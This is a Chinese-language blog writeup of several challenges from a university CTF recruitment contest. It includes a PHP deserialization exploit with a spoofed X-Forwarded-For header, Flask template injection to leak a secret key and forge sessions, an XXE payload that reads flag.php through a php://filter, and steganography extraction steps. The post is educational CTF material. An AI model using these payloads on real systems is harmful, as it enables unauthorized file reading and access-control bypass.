---
title: NEXCTF 招新赛 WirteUP
date: 2019-11-20 21:41:13
categories: CTF
description: 内容包括：前言+环境+各WriteUP+总结
---

# 0x0 前言

本文是上个月学校 NEX 战队招新赛中部分题目的 WriteUP ，因为赛事从结果上来说还是很令人高兴的，所以一直都想单独写一篇博客来记录这些题目，但是因为学校的一堆事情+拖延症的问题，差不多过了1个月才着手做这件事...

# 0x1 相关环境

```bash
Python v3.7.4
requests v2.22.0
Flask v1.1.1
Binwalk v2.1.1
dd
```

# 0x2 各WriteUP

## 0x20 Web 签到

```php
<?php 
highlight_file(__FILE__);

class ttt {
    public function __destruct() {
        try {
            echo file_get_contents("/flag");
        } catch (Exception $e) {
    }
    }
 }

if($_GET['get'] === '1')
{
    if($_POST['post'] === '1')
    {
        if($_SERVER["HTTP_X_FORWARDED_FOR"] === '127.0.0.1')
        {
           unserialize($_POST['class']);
        }
    }
}
```

代码如上，分析知 ttt 类的析构函数会输出 flag 内容，而代码中存在 [unserialize](https://www.php.net/manual/zh/function.unserialize.php) 函数，故可知该代码存在[反序列化漏洞](https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/)。下面来构造 ttt 类的序列化内容，代码如下：

```php
<?php
	class ttt {}
	echo serialize(new ttt);
```

那么现在解决问题的关键就是构造满足三个 if 条件的请求，以使程序流程到达反序列化函数那里。get 和 post 都是常规的请求，这里可以了解一下 [X-Forwarded-For](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For) ，然后可通过 Python3+Requests 构造如下请求来获取  flag：

```python
__import__('requests').post('http://<ip>:<port>/?get=1', data={'post':'1','class':'O:3:"ttt":0:{}'}, headers={'X-Forwarded-For':'127.0.0.1'}).content
```

## 0x21 Baby Flask

[源码]( https://pan.baidu.com/s/1uAlyfJY63h05kG9LmGQQTg) 提取码: upiv

可以看到，路由 /admin 可以获取到 Flag ，该视图函数通过验证 session 中 admin 的值来返还不同的内容；而因为 Flask 是[客户端session](https://www.secpulse.com/archives/97707.html)的模式，故这个值可以人为修改。

那么解题的目标就变成了通过寻找注入点来获取 secretkey ，查看代码知调用 render_template_string 函数时第一个参数传递了 template.replace，将 模版中的 $remembered_name 替换成了 session 中 name 的值，通过查看 index.html 可知该占位符出现在 Info 模块和 Author 输入框的 value 属性中，故可通过合理控制 Author 中的值来实现注入。

而在 app.py 中，通过定义 safe_input 函数针对 post 过来的输入进行了过滤，查看代码可知输入中不能出现 ()[]_ 这几种字符，所以可以通过全局变量 config 来获取secretkey。

拿到key以后，通过构造 session ，并使用浏览器自带的开发者工具将原来的值替换掉即可通过访问 /admin 拿到 Flag。

## 0x22 Baby xxe

```php
<?php 
libxml_disable_entity_loader(false);
$xmlfile = $_POST['name'];
if (empty($xmlfile)) {
	highlight_file(__FILE__);
} else if (stristr($xmlfile, "xml")) {
	$xmlfile = str_ireplace("<!entity", "nonono", $xmlfile);
} else {
	$xmlfile = '<?xml version="1.0"?>
<!DOCTYPE root[
	<!ENTITY all "'.$xmlfile.'">
]>
<root>&all;</root>';
}
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT|LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);
echo ($creds);
?>
```

**提示信息：Flag 在 ./flag.php 中**

尝试直接访问 flag.php 发现内容为 flag{f4ke_fl4g} ，也就是假 Flag ；那么根据提示来分析，很有可能真正的 Flag 被写在 php 代码的注释中或是有 if 条件来限制，所以首要的目标是拿到 flag.php 的代码。

通过分析上面的代码，可以发现 else 中 xmlfile 被双引号扩住，所以不能通过写入 SYSTEM 关键字来达到 xxe 的效果，而 else if 中只要出现 xml 字样就会替换 entity 关键字，但没有进一步的过滤措施，故可以通过载入 dtd 的方式实现注入。

**题目本身是放在服务器上的，故想要访问自定义的 dtd 文件需要具备公网 ip 的设备，这里的复现因为在本地，就不做相关处理了**。假设文件名为 tmp.dtd ，内容如下：

```dtd
<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=./flag.php">

```

这里要注意的是，由于最后 php 解析的是 xml 内容，而 flag.php 代码中存在诸如 <> 的符号，会对解析造成干扰，故采用 php 伪协议将文件内容以 base64 进行编码。

然后通过 Python+Requests 发送如下 POST 请求

```python
__import__("requests").post("http://<ip>:<port>/<题目文件名>", data={"name":'<?xml version="1.0"?><!DOCTYPE root SYSTEM "tmp.dtd"><root>&test;</root>'}).content
```

将得到的 base64 内容解码即可得到 php 代码，经过相关处理得到 Flag。

## 0x23 ScriptBoy

[文件包](https://pan.baidu.com/s/1PtDSpJT8eXlDjw6voKYaig) 提取码: gxfa

**题目描述：筛选出所有文件中前两个数字都是4位的一行，将选出的每一行的第20位组成一个字符串， flag就是这个字符串的32位小写MD5的值**

分析文件结构后可以用如下脚本构造 Flag：

```python
from hashlib import md5

result = []

for i in range(1, 101):
	filename = "./"+str(i)+"/"+str(i)+".txt"
	
	with open(filename) as f:
		content = f.readlines()
	
	for tmp in content:
		split_tmp = tmp.split('----')
		if len(split_tmp[0])==len(split_tmp[1])==4:
			result.append(tmp[19])

print(md5(''.join(result).encode('utf8')).hexdigest())
```

## 0x24 ljmisc

[图片](https://pan.baidu.com/s/1IJ_pA4EL53YvZChEyXsFwQ) 提取码: mnck

⬆️打开链接前请做好心理准备

拿到图片后，执行 `binwalk 1000.png` 即可发现从 0x8B3F4 处开始隐藏了一个压缩包，故可执行 `dd if=1000.png of=test.zip skip=0x8b3f4 bs=1` 来将它提取出来。据说这个包经过了伪加密，但是当时因为环境是 MacOS ，所以也没有经历解密的操作，这里也就先不记录相关内容了。

打开后出现一个新的压缩包和两张图片，新的压缩包是真的被加密过的，所以要从另外两张图片寻找解压密码的线索。

两张图片并不能看出什么分别，但是大小却差了很多，故可以猜测是盲水印。

使用[bwm](https://github.com/chishaxie/BlindWaterMark)处理后可以获得解压密码为 glgjssy_qyhfbqz，输入后即可打开压缩包到达第三层。

解压后的文件是一个充满0和1的文件，当时看了好久都没什么头绪。但是在我万能的舍友的帮助下，猜测这可能是描述了一张二维码，故通过以下脚本将1的位置填充为黑，0的位置填充为白：

```python
from PIL import Image

MAX = 256

pic = Image.new("RGB",(MAX, MAX))

str = ''
with open('./bin.txt') as f:
	str = f.read()

i=0
for y in range (0,MAX):
    for x in range (0,MAX):
        if(str[i] == '1'):
            pic.putpixel([x,y],(0, 0, 0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1

pic.show()
pic.save("flag.png")
```

扫描二维码即可获取 Flag。

# 0x3 总结

本文记录了本次招新赛中的部分题目，其他的题目因为难以复现而暂时无法记录。

技术上的话题就到此为止了，下面是一些题外话：

```bash
5Zug5Li65piv56ys5LiA5qyh5YGaIGN0Zu+8jOaJgOS7peinieW+l+aXoOiuuuWmguS9lemDveimgeWGmeS4gOS6m+S4nOilv++8jOWPr+iDveaYr+S9nOS4uuaWsOaWueWQkeeahOi1t+eCue+8jOS5n+WPr+iDveaYr+S4uuS6huaWueS+v+aXpeWQjueahOWbnuW/huOAggoK5pyA6L+R6YGH5Yiw5LqG5ZCE56eN5LqL5oOF77yM55Sx5q2k5Lmf5oOz5LqG5b6I5aSa44CC5bCx5Zyo5LiK5Liq5a2m5pyf77yM5oiR5Zug5Li65b2T5pe255y85YWJ5q+U6L6D55+t5rWF6ICM5ouS57ud5LqG5LiA5Liq5py65Lya77yM5rKh5oOz5Yiw6L+Z5a2m5pyf5Y205Zug5q2k6ZSZ6L+H5LqG5b6I5aSa5LqL5oOF44CC5a+55LqO6L+Z5Lu25LqL77yM6K+05LiN5ZCO5oKU5piv5LiN5Y+v6IO955qE77yM5L2G5oiR5Y+I5LiN5piv5LiA5Liq5Lya55So6L+H5Y675Y+N5aSN5oqY56Oo6Ieq5bex55qE5Lq677yM6YCJ6ZSZ5LqG5bCx5piv6YCJ6ZSZ5LqG77yM5Lmf5rKh5LuA5LmI5aW96K+055qE44CCCgrog73lpJ/ov5vlhaUgTkVYIOaYr+aIkeayoeacieaDs+WIsOeahO+8jOi/meS5n+iuuOaYr+WPpuS4gOS4quacuuS8muOAguS4jeeuoeaAjuS5iOivtO+8jOWug+S7juWPpuS4gOS4quWxgumdouiuqeaIkeeci+WIsOS6huW+iOWkmuS4nOilv++8jOi/meS+v+Wkn+S6huOAggoK6LCo5Lul5q2k5paH6K2m6YaS5pyq5p2l55qE6Ieq5bex44CC
```



